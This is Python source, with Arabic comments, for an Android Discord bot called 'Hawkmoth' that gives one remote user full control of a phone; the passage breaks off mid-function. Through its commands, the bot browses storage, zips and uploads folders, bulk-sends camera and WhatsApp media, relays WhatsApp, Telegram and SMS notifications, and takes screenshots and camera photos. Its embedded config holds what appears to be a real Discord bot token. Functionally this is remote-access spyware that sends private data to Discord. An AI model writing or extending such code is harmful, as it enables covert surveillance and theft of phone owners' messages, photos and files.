"""
Hawkmoth Bot - النسخة الكاملة المتوافقة مع Chaquopy.
- 47 أمرًا كاملًا
- يستخدم bridge.py للوصول إلى ميزات أندرويد
- يدعم التشغيل من Java (start_bot / stop_bot)
"""

import os
import sys
import json
import asyncio
import logging
import tempfile
import zipfile
import time
import re
import socket
import platform
from pathlib import Path

import discord
from discord.ext import commands
from discord import app_commands

import bridge

# ==========================================================
# الإعدادات
# ==========================================================
EMBEDDED_CONFIG = {
    "DISCORD_TOKEN": "MTU1MTg3ODI4MDkzMDY2NDU1OA.GN8mQu.clClqU6o8tTpblJoPJv1XmlQ9YZqDNsVEIyjiI",
    "GUILD_ID": 1551886031861579786,
    "ALLOWED_USER_ID": 1542765558054002717,
    "DEVICE_NAME": "Huawei",
    "NOTIF_CHANNEL_ID": 0,
    "NOTIF_WATCH": "com.whatsapp,com.whatsapp.w4b,org.telegram.messenger,com.android.mms,com.google.android.apps.messaging",
    "NOTIF_WATCH_ENABLED": "false",
    "WHATSAPP_NOTIF_ONLY": "true",
}


def cfg_str(key, default=""):
    v = os.getenv(key)
    if v not in (None, ""):
        return v
    return EMBEDDED_CONFIG.get(key, default)


def cfg_int(key, default=0):
    try:
        v = os.getenv(key)
        if v not in (None, ""):
            return int(v)
        return int(EMBEDDED_CONFIG.get(key, default))
    except (ValueError, TypeError):
        return default


def cfg_bool(key, default=False):
    v = os.getenv(key)
    if v in (None, ""):
        v = EMBEDDED_CONFIG.get(key, str(default))
    return str(v).lower() in ("1", "true", "yes", "on")


DISCORD_TOKEN = cfg_str("DISCORD_TOKEN", "")
GUILD_ID = cfg_int("GUILD_ID", 0)
ALLOWED_USER_ID = cfg_int("ALLOWED_USER_ID", 0)
NOTIF_CHANNEL_ID = cfg_int("NOTIF_CHANNEL_ID", 0)
NOTIF_WATCH_ENABLED = cfg_bool("NOTIF_WATCH_ENABLED", False)
WHATSAPP_NOTIF_ONLY = cfg_bool("WHATSAPP_NOTIF_ONLY", True)
_notif_watch_str = cfg_str("NOTIF_WATCH", "")
NOTIF_WATCH_PKGS = [p.strip() for p in _notif_watch_str.split(",") if p.strip()]

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("HawkmothBot")


# ==========================================================
# اكتشاف جذور التخزين
# ==========================================================
def _discover_storage_roots():
    roots = []
    seen = set()

    def add(p):
        if not p:
            return
        try:
            rp = os.path.realpath(p)
        except Exception:
            return
        if rp in seen or not os.path.isdir(rp):
            return
        seen.add(rp)
        roots.append(rp)

    # من الجسر
    try:
        files_dir = bridge.get_files_dir()
        if files_dir:
            add(files_dir)
    except Exception:
        pass

    # مسارات أندرويد القياسية
    add("/sdcard")
    add("/storage/emulated/0")
    add(os.getenv("EXTERNAL_STORAGE", ""))

    # مسح /storage
    try:
        for entry in os.listdir("/storage"):
            full = os.path.join("/storage", entry)
            if os.path.isdir(full):
                add(full)
    except Exception:
        pass

    return roots


DISCOVERED_ROOTS = _discover_storage_roots()
ALLOWED_ROOT = DISCOVERED_ROOTS[0] if DISCOVERED_ROOTS else "/sdcard"

log.info(f"📁 الجذر النشط: {ALLOWED_ROOT}")
log.info(f"📁 جذور مكتشفة: {len(DISCOVERED_ROOTS)}")

# مجلد الاستقبال
UPLOAD_DIR = os.path.join(ALLOWED_ROOT, "Pictures", "HawkmothUploads")
try:
    os.makedirs(UPLOAD_DIR, exist_ok=True)
except Exception:
    UPLOAD_DIR = tempfile.gettempdir()
log.info(f"📥 مجلد الاستقبال: {UPLOAD_DIR}")

# مجلد اللقطات
SCREENSHOT_DIR = os.path.join(ALLOWED_ROOT, "DCIM", "HawkmothShots")
try:
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
except Exception:
    SCREENSHOT_DIR = tempfile.gettempdir()
log.info(f"📸 مجلد اللقطات: {SCREENSHOT_DIR}")


# ==========================================================
# ميزات البوت (فحص عبر الجسر)
# ==========================================================
HAS_PIL = False
try:
    from PIL import Image
    HAS_PIL = True
except ImportError:
    log.warning("⚠️ PIL غير متوفر")

HAS_NOTIF_ACCESS = False
try:
    HAS_NOTIF_ACCESS = bridge.is_notification_access_enabled()
except Exception:
    pass

log.info(f"🔔 صلاحية الإشعارات: {'✅' if HAS_NOTIF_ACCESS else '❌'}")

DEVICE_NAME = cfg_str("DEVICE_NAME", "") or socket.gethostname()
DISCORD_LIMIT_MB = 24.0
FILES_PER_PAGE = 20

# مسارات البحث
CAMERA_PATHS = [
    "DCIM/Camera", "DCIM/camera", "DCIM/Camera/RAW",
    "Pictures/Camera", "Pictures/Photos",
    "Camera", "camera", "Photos",
]
SCREENSHOT_PATHS = [
    "DCIM/Screenshots", "DCIM/screenshots",
    "Pictures/Screenshots", "Pictures/screenshots",
    "Screenshots", "screenshots",
]
DOWNLOAD_PATHS = [
    "Download", "Downloads", "download", "downloads",
]
DOCUMENT_PATHS = [
    "Documents", "documents", "Docs",
]
WHATSAPP_MEDIA_PATHS = [
    "Android/media/com.whatsapp/WhatsApp/Media",
    "WhatsApp/Media",
    "Android/media/com.whatsapp.w4b/WhatsApp Business/Media",
]

# حالة
_path_map = {}
_path_counter = [0]
bulk_state = {'suspended': False, 'resume_dir': None, 'resume_index': 0}
FAVORITES = []
_notif_seen = set()
_notif_task = None
_synced_once = False
_bot_loop = None


def short_key(path):
    k = str(_path_counter[0])
    _path_counter[0] += 1
    _path_map[k] = path
    if len(_path_map) > 1000:
        for old in list(_path_map.keys())[:200]:
            del _path_map[old]
    return k


def resolve_key(k):
    return _path_map.get(k, "")


def is_path_allowed(path):
    try:
        real = os.path.realpath(path)
        for root in DISCOVERED_ROOTS or [ALLOWED_ROOT]:
            rr = os.path.realpath(root)
            if real == rr or real.startswith(rr + os.sep):
                return True
        return False
    except Exception:
        return False


def _fmt_size(n):
    try:
        n = float(n)
    except Exception:
        return "?"
    for unit in ('B', 'KB', 'MB', 'GB'):
        if n < 1024:
            return f"{n:.1f}{unit}"
        n /= 1024
    return f"{n:.1f}TB"


def _find_dir_in_roots(candidates):
    for root in DISCOVERED_ROOTS:
        for rel in candidates:
            try:
                p = os.path.join(root, *rel.split("/"))
                if os.path.isdir(p):
                    return p
            except Exception:
                continue
    return None


def _build_tree(root, max_depth=3, current_depth=0, max_items=60, prefix=""):
    lines = []
    if current_depth > max_depth:
        return lines
    try:
        items = sorted(os.listdir(root))[:max_items]
    except Exception as e:
        return [f"{prefix}❌ {e}"]
    for i, name in enumerate(items):
        full = os.path.join(root, name)
        is_last = (i == len(items) - 1)
        connector = "└── " if is_last else "├── "
        if os.path.isdir(full):
            lines.append(f"{prefix}{connector}📁 {name}/")
            if current_depth < max_depth:
                ext = "    " if is_last else "│   "
                lines.extend(_build_tree(full, max_depth, current_depth + 1,
                                          max_items, prefix + ext))
        else:
            try:
                sz = _fmt_size(os.path.getsize(full))
            except Exception:
                sz = "?"
            lines.append(f"{prefix}{connector}📄 {name} ({sz})")
    return lines


async def _compress_image(src_path):
    if not HAS_PIL:
        return src_path
    try:
        from PIL import Image
        root, _ = os.path.splitext(src_path)
        out = root + "_compressed.jpg"
        with Image.open(src_path) as img:
            img.thumbnail((1600, 1600), Image.LANCZOS)
            if img.mode in ('RGBA', 'P', 'LA'):
                img = img.convert('RGB')
            img.save(out, format='JPEG', quality=85, optimize=True)
        return out
    except Exception as e:
        log.warning(f"compress failed: {e}")
        return src_path


# ==========================================================
# البوت
# ==========================================================
intents = discord.Intents.default()
intents.messages = True
intents.message_content = False
bot = commands.Bot(command_prefix="!", intents=intents)


def _check(interaction):
    return interaction.user.id == ALLOWED_USER_ID


# ==========================================================
# FileBrowserView
# ==========================================================
class FileBrowserView(discord.ui.View):
    def __init__(self, path, page=0, sort_by="name"):
        super().__init__(timeout=1800)
        self.path = path
        self.page = page
        self.sort_by = sort_by
        self.total = 0
        self._build()

    def _sort_items(self, items):
        def key(x):
            full = os.path.join(self.path, x)
            is_dir = os.path.isdir(full)
            if self.sort_by == "date":
                try:
                    m = os.path.getmtime(full)
                except Exception:
                    m = 0
                return (not is_dir, -m)
            elif self.sort_by == "size":
                try:
                    s = os.path.getsize(full)
                except Exception:
                    s = 0
                return (not is_dir, -s)
            else:
                return (not is_dir, x.lower())
        return sorted(items, key=key)

    def _build(self):
        try:
            raw = os.listdir(self.path)
        except PermissionError:
            self.add_item(discord.ui.Button(label="❌ لا صلاحية", disabled=True))
            return
        except Exception as e:
            self.add_item(discord.ui.Button(label=f"خطأ: {str(e)[:50]}", disabled=True))
            return

        items = self._sort_items(raw)
        self.total = len(items)
        start = self.page * FILES_PER_PAGE
        end = min(start + FILES_PER_PAGE, self.total)
        page_items = items[start:end]

        options = []
        for name in page_items:
            full = os.path.join(self.path, name)
            if os.path.isdir(full):
                options.append(discord.SelectOption(
                    label=f"📁 {name}"[:100],
                    value=f"d:{short_key(full)}",
                    description="مجلد"
                ))
            else:
                try:
                    sz = _fmt_size(os.path.getsize(full))
                except Exception:
                    sz = "?"
                options.append(discord.SelectOption(
                    label=f"📄 {name}"[:100],
                    value=f"f:{short_key(full)}",
                    description=f"ملف · {sz}"
                ))

        if options:
            select = discord.ui.Select(
                placeholder=f"اختر ({start+1}-{end} من {self.total})",
                options=options,
                min_values=1,
                max_values=1
            )
            select.callback = self._select_cb()
            self.add_item(select)

        parent = os.path.dirname(self.path.rstrip('/')) or '/'
        if self.path != '/' and parent != self.path and is_path_allowed(parent):
            btn = discord.ui.Button(label="⬆️ ..", style=discord.ButtonStyle.secondary)
            btn.callback = self._nav_cb(parent, 0)
            self.add_item(btn)

        if self.page > 0:
            btn = discord.ui.Button(label="⬅️", style=discord.ButtonStyle.secondary)
            btn.callback = self._nav_cb(self.path, self.page - 1)
            self.add_item(btn)

        btn = discord.ui.Button(label="🗜️ ZIP", style=discord.ButtonStyle.danger)
        btn.callback = self._zip_cb(self.path)
        self.add_item(btn)

        if end < self.total:
            btn = discord.ui.Button(label="➡️", style=discord.ButtonStyle.secondary)
            btn.callback = self._nav_cb(self.path, self.page + 1)
            self.add_item(btn)

        for label, mode in (("🔤 اسم", "name"), ("📅 تاريخ", "date"), ("📊 حجم", "size")):
            style = discord.ButtonStyle.success if self.sort_by == mode else discord.ButtonStyle.secondary
            btn = discord.ui.Button(label=label, style=style)
            btn.callback = self._sort_cb(mode)
            self.add_item(btn)

        quick = [
            ("📸 كاميرا", _find_dir_in_roots(CAMERA_PATHS)),
            ("🖼️ لقطات", _find_dir_in_roots(SCREENSHOT_PATHS)),
            ("📥 تنزيلات", _find_dir_in_roots(DOWNLOAD_PATHS)),
            ("📄 مستندات", _find_dir_in_roots(DOCUMENT_PATHS)),
            ("💬 واتساب", _find_dir_in_roots(WHATSAPP_MEDIA_PATHS)),
        ]
        for label, qpath in quick:
            if qpath and qpath != self.path:
                btn = discord.ui.Button(label=label, style=discord.ButtonStyle.primary)
                btn.callback = self._nav_cb(qpath, 0)
                self.add_item(btn)

    def title(self):
        start = self.page * FILES_PER_PAGE
        end = min(start + FILES_PER_PAGE, self.total)
        sort_label = {"name": "اسم", "date": "تاريخ", "size": "حجم"}.get(self.sort_by, "اسم")
        return (
            f"📂 `{self.path}`\n"
            f"({start+1}-{end} من {self.total}) | ترتيب: {sort_label} | 🖥️ `{DEVICE_NAME}`"
        )

    def _select_cb(self):
        async def cb(interaction: discord.Interaction):
            if interaction.user.id != ALLOWED_USER_ID:
                await interaction.response.send_message("غير مصرح.", ephemeral=True)
                return
            value = interaction.data.get("values", [""])[0]
            if ":" not in value:
                await interaction.response.defer()
                return
            kind, key = value.split(":", 1)
            path = resolve_key(key)
            if not path or not is_path_allowed(path):
                await interaction.response.send_message("مسار غير صالح.", ephemeral=True)
                return
            if kind == "d":
                view = FileBrowserView(path, 0, self.sort_by)
                try:
                    await interaction.response.edit_message(content=view.title(), view=view)
                except Exception:
                    await interaction.response.send_message(content=view.title(), view=view)
            else:
                await interaction.response.defer()
                await _send_any_file(interaction, path)
        return cb

    def _nav_cb(self, path, page):
        async def cb(interaction: discord.Interaction):
            if interaction.user.id != ALLOWED_USER_ID:
                await interaction.response.send_message("غير مصرح.", ephemeral=True)
                return
            if not is_path_allowed(path):
                await interaction.response.send_message("❌ خارج النطاق.", ephemeral=True)
                return
            view = FileBrowserView(path, page, self.sort_by)
            try:
                await interaction.response.edit_message(content=view.title(), view=view)
            except Exception:
                await interaction.response.send_message(content=view.title(), view=view)
        return cb

    def _sort_cb(self, mode):
        async def cb(interaction: discord.Interaction):
            if interaction.user.id != ALLOWED_USER_ID:
                await interaction.response.send_message("غير مصرح.", ephemeral=True)
                return
            view = FileBrowserView(self.path, 0, mode)
            try:
                await interaction.response.edit_message(content=view.title(), view=view)
            except Exception:
                await interaction.response.send_message(content=view.title(), view=view)
        return cb

    def _zip_cb(self, path):
        async def cb(interaction: discord.Interaction):
            if interaction.user.id != ALLOWED_USER_ID:
                await interaction.response.send_message("غير مصرح.", ephemeral=True)
                return
            await interaction.response.defer()
            await _send_zip_of_dir(interaction, path)
        return cb


# ==========================================================
# دوال الإرسال
# ==========================================================
async def _send_any_file(interaction, path):
    if not is_path_allowed(path):
        await interaction.followup.send(f"❌ خارج النطاق: `{path}`")
        return
    if not os.path.isfile(path):
        await interaction.followup.send(f"الملف غير موجود: `{path}`")
        return
    try:
        size_mb = os.path.getsize(path) / (1024 * 1024)
    except Exception:
        size_mb = 0
    if size_mb > DISCORD_LIMIT_MB:
        await interaction.followup.send(f"⚠️ {size_mb:.1f}MB > {DISCORD_LIMIT_MB}MB")
        return
    try:
        await interaction.followup.send(file=discord.File(path))
    except Exception as e:
        await interaction.followup.send(f"خطأ: {e}")


async def _send_zip_of_dir(interaction, path):
    if not is_path_allowed(path):
        await interaction.followup.send(f"❌ خارج النطاق: `{path}`")
        return
    if not os.path.isdir(path):
        await interaction.followup.send(f"ليس مجلدًا: `{path}`")
        return
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.zip')
    tmp.close()
    try:
        with zipfile.ZipFile(tmp.name, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, _dirs, files in os.walk(path):
                for fn in files:
                    full = os.path.join(root, fn)
                    rel = os.path.relpath(full, path)
                    try:
                        zf.write(full, rel)
                    except Exception:
                        continue
        size_mb = os.path.getsize(tmp.name) / (1024 * 1024)
        if size_mb > DISCORD_LIMIT_MB:
            await interaction.followup.send(f"⚠️ الأرشيف {size_mb:.1f}MB > الحد")
            return
        fname = f"{os.path.basename(path.rstrip('/')) or 'root'}.zip"
        await interaction.followup.send(file=discord.File(tmp.name, filename=fname))
    except Exception as e:
        await interaction.followup.send(f"خطأ: {e}")
    finally:
        try:
            os.remove(tmp.name)
        except Exception:
            pass


async def _send_images_bulk(interaction, directory, limit=None, start_index=0):
    global bulk_state
    if not is_path_allowed(directory):
        await interaction.followup.send("❌ المسار خارج النطاق.")
        return
    if not os.path.isdir(directory):
        await interaction.followup.send(f"المجلد غير موجود: `{directory}`")
        return
    try:
        files = sorted(
            [os.path.join(directory, f) for f in os.listdir(directory)
             if f.lower().endswith((".jpg", ".jpeg", ".png", ".webp", ".gif", ".heic"))],
            key=os.path.getmtime, reverse=True
        )
    except Exception as e:
        await interaction.followup.send(f"خطأ: {e}")
        return
    if limit:
        files = files[:limit]
    if not files:
        await interaction.followup.send("لا توجد صور.")
        return

    bulk_state['suspended'] = False
    bulk_state['resume_dir'] = directory
    bulk_state['resume_index'] = start_index

    await interaction.followup.send(f"📤 إرسال من {start_index}/{len(files)} من `{directory}`...")
    sent = 0
    for idx in range(start_index, len(files)):
        if bulk_state['suspended']:
            bulk_state['resume_index'] = idx
            await interaction.followup.send(f"⛔ توقف عند {idx}. استخدم `/resume`.")
            return
        fp = files[idx]
        compressed = await _compress_image(fp)
        try:
            size_mb = os.path.getsize(compressed) / (1024 * 1024)
            if size_mb > DISCORD_LIMIT_MB:
                await interaction.followup.send(f"⚠️ {os.path.basename(fp)} ({size_mb:.1f}MB)")
                continue
            await interaction.followup.send(file=discord.File(compressed))
            sent += 1
            await asyncio.sleep(0.5)
        except Exception as e:
            await interaction.followup.send(f"تعذر: {e}")
        finally:
            if compressed != fp and os.path.exists(compressed):
                try:
                    os.remove(compressed)
                except Exception:
                    pass
    bulk_state['resume_dir'] = None
    bulk_state['resume_index'] = 0
    await interaction.followup.send(f"✅ انتهى ({sent} صورة).")


async def _find_files(name_query, roots, max_results=20, max_depth=8, use_regex=False):
    results = []
    skip_dirs = {"Android", ".thumbnails", "cache", ".cache", "node_modules", ".git"}
    if use_regex:
        try:
            pattern = re.compile(name_query, re.IGNORECASE)
        except re.error:
            pattern = None
    else:
        pattern = None
    query = name_query.lower()

    for root in roots:
        if not os.path.isdir(root):
            continue
        try:
            for dirpath, dirnames, filenames in os.walk(root):
                depth = dirpath[len(root):].count(os.sep)
                if depth >= max_depth:
                    dirnames[:] = []
                    continue
                dirnames[:] = [d for d in dirnames
                               if d not in skip_dirs and not d.startswith('.')]
                for fn in filenames:
                    match = bool(pattern.search(fn)) if pattern else (query in fn.lower())
                    if match:
                        results.append(os.path.join(dirpath, fn))
                        if len(results) >= max_results:
                            return results
        except Exception:
            continue
    return results


class FindResultsView(discord.ui.View):
    def __init__(self, results, query):
        super().__init__(timeout=900)
        self.results = results
        options = []
        for p in results[:25]:
            label = os.path.basename(p)[:80]
            parent = os.path.basename(os.path.dirname(p))[:30]
            options.append(discord.SelectOption(
                label=label,
                value=short_key(p),
                description=f"📁 {parent}"[:100]
            ))
        if options:
            select = discord.ui.Select(
                placeholder=f"اختر ملفًا من {len(results)}",
                options=options, min_values=1, max_values=1
            )
            select.callback = self._cb
            self.add_item(select)

    async def _cb(self, interaction: discord.Interaction):
        if interaction.user.id != ALLOWED_USER_ID:
            await interaction.response.send_message("غير مصرح.", ephemeral=True)
            return
        key = interaction.data.get("values", [""])[0]
        path = resolve_key(key)
        if not path or not os.path.isfile(path):
            await interaction.response.send_message("ملف غير موجود.", ephemeral=True)
            return
        await interaction.response.defer()
        await _send_any_file(interaction, path)


# ==========================================================
# مراقب الإشعارات
# ==========================================================
async def _notification_watcher_loop():
    global _notif_seen
    log.info("🔔 بدء مراقب الإشعارات...")
    interval = 15
    while True:
        try:
            if not NOTIF_CHANNEL_ID:
                await asyncio.sleep(30)
                continue
            data = await asyncio.to_thread(bridge.get_notifications, "", 50)
            try:
                arr = json.loads(data)
            except Exception:
                arr = []
            for n in arr:
                pkg = n.get("packageName", "")
                if WHATSAPP_NOTIF_ONLY and "whatsapp" not in pkg.lower():
                    continue
                if NOTIF_WATCH_PKGS and not any(p in pkg for p in NOTIF_WATCH_PKGS):
                    continue
                key = f"{pkg}:{n.get('id', '')}:{n.get('title', '')}:{n.get('content', '')}"
                if key in _notif_seen:
                    continue
                _notif_seen.add(key)
                if len(_notif_seen) > 800:
                    _notif_seen = set(list(_notif_seen)[-300:])
                try:
                    ch = bot.get_channel(NOTIF_CHANNEL_ID)
                    if ch:
                        icon = "📱"
                        low = pkg.lower()
                        if "whatsapp" in low:
                            icon = "💬"
                        elif "telegram" in low:
                            icon = "✈️"
                        elif "mms" in low or "messaging" in low:
                            icon = "📩"
                        title = (n.get("title") or "").strip()
                        content = (n.get("content") or "").strip()
                        if title or content:
                            msg = f"{icon} **{title or '(بدون عنوان)'}**\n{content}\n`{pkg}`"
                            await ch.send(msg[:1900])
                except Exception as e:
                    log.debug(f"notif send: {e}")
            await asyncio.sleep(interval)
        except Exception as e:
            log.debug(f"watcher: {e}")
            await asyncio.sleep(30)


# ==========================================================
# الأحداث
# ==========================================================
@bot.event
async def on_ready():
    global _synced_once, _notif_task
    log.info(f"✅ Logged in as {bot.user}")
    log.info(f"🔔 Notifications access: {'✅' if HAS_NOTIF_ACCESS else '❌'}")
    log.info(f"🖼️ PIL: {'✅' if HAS_PIL else '❌'}")

    if _notif_task is None and NOTIF_WATCH_ENABLED and NOTIF_CHANNEL_ID:
        _notif_task = asyncio.create_task(_notification_watcher_loop())
        log.info(f"🔔 Notification watcher started")

    if _synced_once:
        log.info("ℹ️ إعادة اتصال")
        return
    try:
        if GUILD_ID:
            guild = discord.Object(id=GUILD_ID)
            bot.tree.copy_global_to(guild=guild)
            synced = await bot.tree.sync(guild=guild)
        else:
            synced = await bot.tree.sync()
        log.info(f"✅ Synced {len(synced)} commands")
        _synced_once = True
    except Exception as e:
        log.error(f"❌ Sync error: {e}")


@bot.event
async def on_message(message):
    if message.author.id != ALLOWED_USER_ID:
        return
    if not message.attachments:
        return
    saved = []
    for att in message.attachments:
        try:
            safe_name = re.sub(r'[^\w\-_. ]', '_', att.filename)[:200]
            dest = os.path.join(UPLOAD_DIR, safe_name)
            base, ext = os.path.splitext(dest)
            i = 1
            while os.path.exists(dest):
                dest = f"{base}_{i}{ext}"
                i += 1
            await att.save(dest)
            saved.append(os.path.basename(dest))
        except Exception as e:
            log.error(f"upload save failed: {e}")
    if saved:
        try:
            await message.reply(
                f"📥 حُفظ {len(saved)} ملف في `{UPLOAD_DIR}`:\n" +
                "\n".join(f"• `{n}`" for n in saved),
                mention_author=False
            )
        except Exception:
            pass


# ==========================================================
# الأوامر - 1) لوحة التحكم
# ==========================================================
@bot.tree.command(name="start", description="لوحة التحكم الرئيسية")
async def start_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.send_message(
        f"🖥️ **{DEVICE_NAME}**\n"
        f"📁 الجذر: `{ALLOWED_ROOT}`\n"
        f"📥 الاستقبال: `{UPLOAD_DIR}`\n"
        f"📸 اللقطات: `{SCREENSHOT_DIR}`\n"
        f"📚 جذور: **{len(DISCOVERED_ROOTS)}**\n"
        f"🖼️ PIL: {'✅' if HAS_PIL else '❌'}\n"
        f"🔔 إشعارات: {'✅' if HAS_NOTIF_ACCESS else '❌'}\n"
        f"🔔 مراقب: {'✅' if NOTIF_WATCH_ENABLED and NOTIF_CHANNEL_ID else '❌'}\n\n"
        "**💬 واتساب:**\n"
        "`/wa [رقم] [نص]` `/wa_home`\n"
        "`/notifications` `/notif_watch`\n"
        "`/sms [n]` `/send_sms` `/contacts` `/dial`\n\n"
        "**تصفح:**\n"
        "`/browse` `/storage` `/camera` `/screenshots`\n"
        "`/downloads` `/documents` `/whatsapp_media`\n"
        "`/tree` `/favorites`\n\n"
        "**سحب:**\n"
        "`/latest` `/pull_camera` `/pull_screens`\n"
        "`/get` `/zip` `/resume` `/stop`\n\n"
        "**بحث:**\n"
        "`/search` `/find`\n\n"
        "**📷 التقاط:**\n"
        "`/screenshot` `/snap_back` `/snap_front`\n"
        "`/camera_app` `/battery` `/clipboard` `/toast`\n\n"
        "**📱 تطبيقات:**\n"
        "`/openapp` `/apps` `/openurl`\n\n"
        "**تحكم:**\n"
        "`/open` `/save` `/upload`\n\n"
        "**التخزين:**\n"
        "`/roots` `/setroot` `/rescan`\n\n"
        "**معلومات:**\n"
        "`/ip` `/location` `/sysinfo`"
    )


# ==========================================================
# الأوامر - 2) التصفح
# ==========================================================
@bot.tree.command(name="browse", description="تصفح حر لأي مسار")
@app_commands.describe(path="المسار (افتراضي: الجذر)")
async def browse_cmd(interaction: discord.Interaction, path: str = None):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    target = path or ALLOWED_ROOT
    if not is_path_allowed(target):
        await interaction.response.send_message("❌ خارج النطاق.", ephemeral=True)
        return
    if not os.path.isdir(target):
        await interaction.response.send_message(f"ليس مجلدًا: `{target}`", ephemeral=True)
        return
    view = FileBrowserView(target, 0)
    await interaction.response.send_message(view.title(), view=view)


@bot.tree.command(name="storage", description="التخزين الرئيسي")
async def storage_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    view = FileBrowserView(ALLOWED_ROOT, 0)
    await interaction.response.send_message(view.title(), view=view)


@bot.tree.command(name="camera", description="مجلد الكاميرا")
async def camera_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    path = _find_dir_in_roots(CAMERA_PATHS)
    if not path:
        await interaction.response.send_message("لم أجد مجلد الكاميرا.", ephemeral=True)
        return
    view = FileBrowserView(path, 0)
    await interaction.response.send_message(view.title(), view=view)


@bot.tree.command(name="screenshots", description="لقطات الشاشة")
async def screenshots_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    path = _find_dir_in_roots(SCREENSHOT_PATHS)
    if not path:
        await interaction.response.send_message("لم أجد مجلد اللقطات.", ephemeral=True)
        return
    view = FileBrowserView(path, 0)
    await interaction.response.send_message(view.title(), view=view)


@bot.tree.command(name="downloads", description="التنزيلات")
async def downloads_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    path = _find_dir_in_roots(DOWNLOAD_PATHS)
    if not path:
        await interaction.response.send_message("لم أجد مجلد التنزيلات.", ephemeral=True)
        return
    view = FileBrowserView(path, 0)
    await interaction.response.send_message(view.title(), view=view)


@bot.tree.command(name="documents", description="المستندات")
async def documents_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    path = _find_dir_in_roots(DOCUMENT_PATHS)
    if not path:
        await interaction.response.send_message("لم أجد مجلد المستندات.", ephemeral=True)
        return
    view = FileBrowserView(path, 0)
    await interaction.response.send_message(view.title(), view=view)


@bot.tree.command(name="whatsapp_media", description="وسائط واتساب")
async def whatsapp_media_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    path = _find_dir_in_roots(WHATSAPP_MEDIA_PATHS)
    if not path:
        await interaction.response.send_message("لم أجد مجلد وسائط واتساب.", ephemeral=True)
        return
    view = FileBrowserView(path, 0)
    await interaction.response.send_message(view.title(), view=view)


@bot.tree.command(name="tree", description="شجرة مجلد")
@app_commands.describe(path="المسار", depth="العمق (1-5)")
async def tree_cmd(interaction: discord.Interaction, path: str = None, depth: int = 3):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    target = path or ALLOWED_ROOT
    if not is_path_allowed(target) or not os.path.isdir(target):
        await interaction.response.send_message("مسار غير صالح.", ephemeral=True)
        return
    depth = max(1, min(5, depth))
    await interaction.response.defer()
    lines = [f"🌳 `{target}` (عمق {depth})\n"]
    lines.extend(_build_tree(target, max_depth=depth))
    text = "\n".join(lines)
    if len(text) > 1900:
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.txt',
                                          mode='w', encoding='utf-8')
        tmp.write(text)
        tmp.close()
        try:
            await interaction.followup.send(file=discord.File(tmp.name, filename="tree.txt"))
        finally:
            try:
                os.remove(tmp.name)
            except Exception:
                pass
    else:
        await interaction.followup.send(f"```\n{text[:1900]}\n```")


# ==========================================================
# الأوامر - 3) البحث
# ==========================================================
@bot.tree.command(name="search", description="بحث متقدم")
@app_commands.describe(name="الاسم أو Regex", regex="استخدام Regex؟", limit="الحد (1-25)")
async def search_cmd(interaction: discord.Interaction, name: str,
                     regex: bool = False, limit: int = 20):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    limit = max(1, min(25, limit))
    await interaction.response.defer()
    try:
        results = await _find_files(name, DISCOVERED_ROOTS,
                                    max_results=limit, max_depth=8, use_regex=regex)
    except Exception as e:
        await interaction.followup.send(f"خطأ: {e}")
        return
    if not results:
        await interaction.followup.send(f"لا نتائج لـ `{name}`.")
        return
    view = FindResultsView(results, name)
    await interaction.followup.send(
        f"🔎 **{len(results)}** نتيجة لـ `{name}`" + (" (Regex)" if regex else ""),
        view=view
    )


@bot.tree.command(name="find", description="بحث سريع")
@app_commands.describe(name="جزء من الاسم", limit="الحد (1-20)")
async def find_cmd(interaction: discord.Interaction, name: str, limit: int = 15):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    limit = max(1, min(20, limit))
    await interaction.response.defer()
    try:
        results = await _find_files(name, DISCOVERED_ROOTS, max_results=limit, max_depth=6)
    except Exception as e:
        await interaction.followup.send(f"خطأ: {e}")
        return
    if not results:
        await interaction.followup.send(f"لا نتائج لـ `{name}`.")
        return
    view = FindResultsView(results, name)
    await interaction.followup.send(f"🔍 **{len(results)}** نتيجة لـ `{name}`:", view=view)


# ==========================================================
# الأوامر - 4) التقاط
# ==========================================================
@bot.tree.command(name="screenshot", description="لقطة شاشة")
@app_commands.describe(send="أرسلها لديسكورد؟")
async def screenshot_cmd(interaction: discord.Interaction, send: bool = True):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    await interaction.response.defer()
    try:
        path = await asyncio.to_thread(bridge.capture_screen)
    except Exception as e:
        await interaction.followup.send(f"❌ {e}")
        return
    if not path or not os.path.isfile(path):
        await interaction.followup.send(
            "❌ فشل التقاط الشاشة.\n"
            "**ملاحظة:** في Android 11+، لقطة الشاشة الحقيقية تحتاج MediaProjection."
        )
        return
    size_mb = os.path.getsize(path) / (1024 * 1024)
    if size_mb > DISCORD_LIMIT_MB:
        await interaction.followup.send(f"⚠️ {size_mb:.1f}MB > الحد\n`{path}`")
        return
    if send:
        try:
            await interaction.followup.send(
                content=f"📸 لقطة — `{os.path.basename(path)}`",
                file=discord.File(path)
            )
        except Exception as e:
            await interaction.followup.send(f"خطأ: {e}")
    else:
        await interaction.followup.send(f"📸 حُفظت في `{path}`")


@bot.tree.command(name="snap_back", description="صورة بالكاميرا الخلفية")
async def snap_back_cmd(interaction: discord.Interaction):
    if not _check(interaction):
